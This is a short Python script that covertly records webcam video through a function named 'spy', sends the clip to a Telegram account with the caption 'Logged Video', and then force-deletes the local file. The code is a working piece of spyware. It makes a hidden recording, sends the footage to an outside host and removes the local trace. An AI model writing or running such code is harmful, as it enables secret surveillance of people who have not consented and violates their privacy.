import cv2
import pyttsx3
import sklearn
import telegram_send 
import os
import time

def spy():

    out.write(frame)

cam = cv2.VideoCapture(0)

fourcc = cv2.VideoWriter_fourcc(*'XVID')
out = cv2.VideoWriter('output.avi',fourcc, 20.0, (640,480))

i = 1

while (i < 20):

    ret, frame = cam.read()
    frame = cv2.flip(frame, 1)
    spy()

    i += 1

    if cv2.waitKey(1) & 0xFF == ord('q'):
        break

cam.release()
out.release()
cv2.destroyAllWindows()

os.system('telegram-send --video output.avi --caption Logged Video ')
time.sleep(2)
os.system('del /f output.avi')